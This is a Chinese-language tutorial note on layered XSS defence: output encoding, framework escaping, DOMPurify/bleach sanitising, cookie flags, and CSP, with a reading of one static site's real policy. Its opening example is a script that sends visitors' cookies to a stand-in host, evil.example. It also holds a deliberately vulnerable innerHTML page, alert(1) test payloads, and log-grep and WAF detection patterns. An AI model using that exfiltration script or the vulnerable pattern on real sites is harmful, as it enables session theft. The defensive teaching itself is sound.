---
order: 200
title: XSS 防御
module: 'cybersecurity'
category: 云与基础设施
difficulty: beginner
description: XSS 防御学习笔记：从本地复现一个存储型 XSS 出发，逐层加防御（输出编码、框架自动转义、DOMPurify、Cookie 加固、CSP），并用 FANDEX 网页端真实 CSP 做案例解读。
author: fanquanpp
updated: '2026-09-12'
related:
  - 'cybersecurity/190-XSSAttack'
  - 'cybersecurity/160-OWASPTop10Detailed'
  - 'cybersecurity/350-WAFRule'
  - 'cybersecurity/220-CSRFDefense'
prerequisites:
  - 'cybersecurity/010-SecurityBasicsDefense'
---

## 场景：一个评论框引发的会话失窃

你的站点有个评论框，用户输入会显示在页面上。某个访客提交了这条「评论」：

```html
<script>
  document.location = 'https://evil.example/?c=' + encodeURIComponent(document.cookie)
</script>
```

后端原样入库，页面原样渲染。之后每个打开这篇评论的人，浏览器都会执行这段脚本，
把自己的 Cookie 发往攻击者服务器——**存储型 XSS**，一个受害者变成下一个攻击源。

防御不是单点，是四层纵深：

```text
第 1 层  输出编码/安全 API   让输入永远是「文本」，永远变不成「代码」
第 2 层  富文本消毒           必须允许部分 HTML 时的白名单过滤
第 3 层  Cookie 加固          纵深防御：就算脚本跑了，也偷不走会话
第 4 层  CSP                  最后的网：就算全失守，限制脚本/外联能做什么
```

## 动手：先复现，再逐层拆掉它

本地起一个最小漏洞页（保存为 `vuln.html`，直接双击打开）：

```html
<!doctype html>
<meta charset="utf-8">
<div id="output"></div>
<script>
  // 漏洞代码：把 location.hash（URL # 后面的内容）当 HTML 插入 —— 典型 DOM 型 XSS
  document.getElementById('output').innerHTML = location.hash.slice(1)
</script>
```

打开 `vuln.html#<img src=x onerror=alert(1)>`，弹窗出现。这就是 DOM 型 XSS：
**数据**（URL 片段）被当成了**代码**执行。常见测试载荷就几种形态，专门用来测自己的页面：

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<input onfocus=alert(1) autofocus>
<div onmouseover=alert(1)>hover</div>
```

现在开始修。第一步，一行改动：

```javascript
// 修法一：安全的 DOM API —— 内容按纯文本处理，永远不会被解析为标签
document.getElementById('output').textContent = location.hash.slice(1)
```

刷新同一 URL，弹窗没了，输入以原文显示。这一行就是 XSS 防御的本质：
**把「数据」和「代码」的边界钉死**。

## 第 1 层：输出编码与安全 API

### 核心原则：在输出时编码，按上下文选方法

用户数据要进 HTML，就在输出点编码；同一段数据可能进不同上下文
（HTML 正文、属性、JS 字符串、URL），各自需要不同的编码——所以不存在「入库时清洗一次」
的万能解，入库存原文、出口做编码才是可审计的做法。

```python
# Python：html.escape 转 & < > " ' 五个字符
import html
safe = html.escape('<script>alert(1)</script>')
# 输出: &lt;script&gt;alert(1)&lt;/script&gt;
```

```php
// PHP：htmlspecialchars 必须带 ENT_QUOTES（否则单引号不转义，属性上下文仍可注入）
$safe = htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
```

```java
// Java：Apache Commons Text
import org.apache.commons.text.StringEscapeUtils;
String safe = StringEscapeUtils.escapeHtml4(input);
```

```javascript
// 手写场景（无模板引擎时）：
function escapeHtml(text) {
  const map = {'&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;'};
  return String(text).replace(/[&<>"']/g, m => map[m]);
}
```

为什么「在别的字符里藏代码」防不住？因为 HTML 解析前会先做实体解码与 JS 字符串解码——
`<script>alert&#40;1&#41;</script>` 这类编码变形最终仍会还原执行。**过滤黑名单注定挂一漏万，
编码 + 安全 API 是结构性防御**，这也是别依赖「关键字过滤」的原因。

### 框架的自动转义：默认安全，但要认得「逃生舱」

现代模板引擎默认转义，绝大多数 XSS 来自主动关掉它：

```python
# Django 模板默认自动转义；|safe 是显式声明「我担保无风险」，滥用是事故高发点
{{ user_input }}          # 安全
{{ user_input|safe }}     # 危险逃生舱，仅用于已消毒内容

# Jinja2：确保环境开启 autoescape（Flask 默认对 .html 开）
from jinja2 import Environment, select_autoescape
env = Environment(autoescape=select_autoescape(['html', 'xml']))
```

```jsx
// React：JSX 表达式默认转义
<div>{userInput}</div>                                  // 安全
<div dangerouslySetInnerHTML={{__html: sanitizedHtml}} />  // 仅允许喂 DOMPurify 之后的输出
```

## 第 2 层：富文本消毒（必须允许部分 HTML 时）

评论区允许加粗、链接？那就不能整体转义，改用白名单消毒——只放行声明的标签与属性：

```javascript
// 浏览器端：DOMPurify 是事实标准
import DOMPurify from 'dompurify';
const clean = DOMPurify.sanitize(userInput, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
  ALLOWED_ATTR: ['href']
});
```

```javascript
// Node.js 服务端：DOMPurify 需要 DOM 环境，配 jsdom
const createDOMPurify = require('dompurify');
const { JSDOM } = require('jsdom');
const DOMPurify = createDOMPurify(new JSDOM('').window);
const clean = DOMPurify.sanitize(userInput, { ALLOWED_TAGS: ['b', 'i', 'a'], ALLOWED_ATTR: ['href'] });
```

```python
# Python 服务端：bleach 同思路
from bleach import clean
cleaned = clean(user_input, tags=['b', 'i', 'a'], attributes={'a': ['href']})
```

入口白名单验证仍是好习惯（能先挡掉一大类垃圾），但它替代不了输出编码：

```python
import re
if re.match(r'^[a-zA-Z0-9_]+$', username):   # 用户名这类强格式字段：白名单字符集
    ...
username = request.form.get('username', '')[:50]  # 长度限制，降低攻击面
```

## 第 3 层：Cookie 加固——脚本跑起来也偷不走会话

```http
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
```

- `HttpOnly`：JS 读不到 Cookie，开头的窃取脚本直接失效（对 XSS 只防「偷 Cookie」这一条腿）。
- `Secure`：只经 HTTPS 传输。
- `SameSite`：控制跨站携带，主要防 CSRF（见 cybersecurity/220-CSRFDefense）。

各语言设置方式：

```php
setcookie('session', $value, ['httponly' => true, 'secure' => true, 'samesite' => 'Strict']);
```

```java
Cookie cookie = new Cookie("session", value);
cookie.setHttpOnly(true);
cookie.setSecure(true);
response.addCookie(cookie);
```

```javascript
// Express
res.cookie('session', value, { httpOnly: true, secure: true, sameSite: 'strict', maxAge: 3600000 });
```

## 第 4 层：CSP——最后的网

Content-Security-Policy 用白名单声明「页面允许加载/执行哪些来源的什么资源」。最狠的一条是
`script-src` 不含 `'unsafe-inline'`：即使注入成功，内联 `<script>` 也拒绝执行。

```http
# 理想形态：禁止一切内联脚本，只许同源外部脚本
Content-Security-Policy: default-src 'self'; script-src 'self'

# 必须放行某个 CDN 时，精确到来源而不是放开内联
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com

# 依赖内联脚本的存量站点：nonce 方式（每次响应随机值，注入的脚本没有 nonce 就不执行）
Content-Security-Policy: script-src 'nonce-abc123random456'
```

### 案例：读 FANDEX 的真实 CSP

本笔记库网页端把 CSP 写在 `app-web/src/lib/csp.ts`，随页面下发（Nginx 场景则用
`add_header ... always`）：

```text
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net;
  style-src 'self' 'unsafe-inline';
  font-src 'self' data:;
  img-src 'self' data:;
  connect-src 'self'
```

逐条读它的取舍：

- FANDEX 是纯静态站点，本身没有用户输入渲染点，XSS 面主要来自第三方依赖被投毒；
  `script-src` 限定「自身 + jsDelivr」把外联面压到最小。
- 保留了 `'unsafe-inline'`（Astro 内联了少量启动脚本），这是现实中的常见妥协——所以本例的
  CSP 不是「挡住 XSS」的那一层，而是「挡住任意来源」的那层。
- `connect-src 'self'` 最有防御价值：就算有脚本被执行，它也**无法把数据发往第三方域名**，
  开头的窃取外联直接被浏览器掐断。
- 另一个细节：CSP 经 `<meta http-equiv>` 下发在部分指令上有限制（如 `frame-ancestors`
  无效），生产服务端头是更完整的做法。

动手验证：`curl -sI https://fanquanpp.github.io/FANDEX/ | grep -i content-security`，
再想想如果换成你自己的站点，哪一条该先收紧。

## DOM 安全补充：URL 与跳转

```javascript
// 防 javascript: 伪协议跳转：用 URL 解析判断协议，而不是字符串正则
function isSafeUrl(url) {
  try {
    const u = new URL(url);
    return u.protocol === 'http:' || u.protocol === 'https:';
  } catch {
    return false;
  }
}
```

创建节点的安全写法：

```javascript
const div = document.createElement('div');   // 结构由代码决定
div.textContent = userInput;                 // 内容按数据处理
container.appendChild(div);
```

## 检测与监控

上线后的兜底手段：日志特征、WAF 规则（见 cybersecurity/350-WAFRule），以及定期用
cybersecurity/190-XSSAttack 中的思路对自己的站点做授权测试。

```bash
# 从 Nginx 访问日志里找 XSS 探测特征
grep -iE "<script|onerror=|onload=|javascript:" /var/log/nginx/access.log

# 统计攻击来源 IP，判断是扫描器批量行为还是定向测试
grep -iE "<script|onerror=|onload=" /var/log/nginx/access.log | awk '{print $1}' | sort | uniq -c | sort -rn
```

```apache
# ModSecurity 自定义规则示例（生产建议直接启用 OWASP CRS 规则集）
SecRule ARGS "(?i)(<script|javascript:|onerror=|onload=)" "id:1002,phase:2,deny,status:403"
```

## 坑点与自检

| 坑点 | 事实 |
| :--- | :--- |
| 入库时统一「清洗」一次 | 上下文不同编码不同；存原文、输出点编码才可审计 |
| PHP htmlspecialchars 忘了 ENT_QUOTES | 单引号不转义，属性上下文仍可注入 |
| 拿黑名单过滤 `<script>` | `<img onerror>`、`<svg onload>`、事件属性、编码变形全会绕过 |
| React/Vue 用了就高枕无忧 | `dangerouslySetInnerHTML`/`v-html` 是手动逃生舱，用法不当照样注入 |
| 把 CSP 当唯一防线 | 带 `'unsafe-inline'` 的 CSP 只限来源；编码、消毒、Cookie 加固一层都不能少 |
| 只测 `alert(1)` 不测数据外联 | `connect-src`、`HttpOnly` 是否生效，要用外联请求与 Cookie 读取分别验证 |

自检清单：所有把用户数据写进页面的出口都走安全 API 或模板转义了吗？富文本是否过
DOMPurify/bleach？会话 Cookie 三件套齐了吗？CSP 是否至少做到了限制脚本与外联来源？

## 练习

1. 把本文 `vuln.html` 修完之后，再用五种载荷（含 `#` URL 变形与大小写）测一遍，确认全部
   以文本显示。
2. 用 Express 或 Django 写一个带评论框的小应用，给会话 Cookie 加三件套，然后验证
   `document.cookie` 读不到 session。
3. 给你的站点加 `Content-Security-Policy: default-src 'self'` 试运行，在控制台观察哪些
   资源被拦，逐条决定放行还是改造——这正是 FANDEX 网页端 CSP 的演进方式。
4. 在浏览器控制台对比 `innerHTML` 与 `textContent` 接收 `<img src=x onerror=alert(1)>`
   的差异，并向同伴解释为什么。

## 下一步

- cybersecurity/190-XSSAttack：从攻击视角理解注入点分类，才能对症设防。
- cybersecurity/350-WAFRule：CSP 之外的运行时防线。
- cybersecurity/220-CSRFDefense：SameSite/Cookie 加固的另一半故事。
